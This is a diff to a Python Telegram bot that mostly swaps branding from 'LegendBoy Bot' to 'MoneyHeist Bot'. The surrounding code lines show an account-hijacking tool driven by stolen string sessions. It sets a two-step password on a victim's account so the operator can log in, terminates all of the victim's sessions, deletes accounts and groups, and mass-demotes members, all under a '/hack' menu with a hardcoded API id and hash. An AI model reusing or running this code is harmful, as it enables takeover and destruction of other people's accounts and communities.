@@ -1,4 +1,4 @@
-# All credit goes to LEGEND-OS
+# All credit goes to Professor-Money-Heist
 
 import os
 
@@ -106,7 +106,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
-            await X.edit_2fa("LEGENDBOY IS BEST")
+            await X.edit_2fa("MONEY HEIST BOT IS TRENDING STYLISH ")
             return True
         except:
             return False
@@ -191,7 +191,7 @@ import logging
 
 logging.basicConfig(level=logging.WARNING)
 
-channel = "Its_LegendBot"
+channel = "Prof_Agora"
 
 menu = """
 Reply To My Message If I am using In Group
@@ -296,7 +296,7 @@ async def start(event):
                     "This StringSession Has Been Terminated.\n/hack"
                 )
             i = await usermsgs(strses.text)
-            await event.reply(i + "\n\nThanks For using LegendBoy Bot")
+            await event.reply(i + "\n\nThanks For using MONEY-HEIST-BOT")
         elif r == "E":
             await x.send_message("⚡GIVE STRING SESSION⚡")
             strses = await x.get_response()
@@ -311,7 +311,7 @@ async def start(event):
             grpid = await x.get_response()
             await joingroup(strses.text, grpid.text)
             await event.reply(
-                "Joined the Channel/Group Thanks For using LegendBoy Bot.\n/hack"
+                "Joined the Channel/Group Thanks For using MONEY-HEIST-BOT.\n/hack"
             )
         elif r == "F":
             await x.send_message("GIVE STRING SESSION")
@@ -327,7 +327,7 @@ async def start(event):
             grpid = await x.get_response()
             await leavegroup(strses.text, grpid.text)
             await event.reply(
-                "Leaved the Channel/Group Thanks For using Boy Bot.\n/hack"
+                "Leaved the Channel/Group Thanks For using MONEYHEIST Bot.\n/hack"
             )
         elif r == "G":
             await x.send_message("GIVE STRING SESSION")
@@ -343,7 +343,7 @@ async def start(event):
             grpid = await x.get_response()
             await delgroup(strses.text, grpid.text)
             await event.reply(
-                "Deleted the Channel/Group Thanks For using LegendBoyBot.\n/hack"
+                "Deleted the Channel/Group Thanks For using MONEYHEIST bot.\n/hack"
             )
         elif r == "H":
             await x.send_message("GIVE STRING SESSION")
@@ -358,7 +358,7 @@ async def start(event):
             i = await user2fa(strses.text)
             if i:
                 await event.reply(
-                    "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.\n/hack"
+                    "User don't have two step thats why now two step is `MoneyHeist Bot Is best` you can login now\n\nThanks For using MoneyHeist Bot.\n/hack"
                 )
             else:
                 await event.reply("Sorry User Have two step already")
@@ -374,7 +374,7 @@ async def start(event):
                 )
             i = await terminate(strses.text)
             await event.reply(
-                "The all sessions are terminated\n\nThanks For using LegendBoyBot.\n/hack"
+                "The all sessions are terminated\n\nThanks For using MoneyHeist bot.\n/hack"
             )
         elif res.text == "J":
             await x.send_message("GIVE STRING SESSION")
@@ -388,7 +388,7 @@ async def start(event):
                 )
             i = await delacc(strses.text)
             await event.reply(
-                "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot."
+                "The Account is deleted SUCCESSFULLLY\n\nThanks For using MoneyHeist bot Bot."
             )
         elif res.text == "L":
             await x.send_message("GIVE STRING SESSION")
@@ -406,7 +406,7 @@ async def start(event):
             user = await x.get_response()
             i = await promote(strses.text, grp.text, user.text)
             await event.reply(
-                "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.\n/hack"
+                "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using MoneyHeist Bot.\n/hack"
             )
         elif res.text == "K":
             await x.send_message("GIVE STRING SESSION")
@@ -425,7 +425,7 @@ async def start(event):
             except:
                 pass
             await event.reply(
-                "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LegendBoyBot.\n/hack"
+                "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using MoneyHeist Bot.\n/hack"
             )
         elif res.text == "M":
             await x.send_message("GIVE STRING SESSION")
@@ -461,7 +461,7 @@ async def start(event):
                     await event.respond("Something is wrong")
             except Exception as e:
                 await event.respond(
-                    "SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e)
+                    "SEND THIS ERROR TO - @MM_USERBOT\n**LOGS**\n" + str(e)
                 )
 
         else:
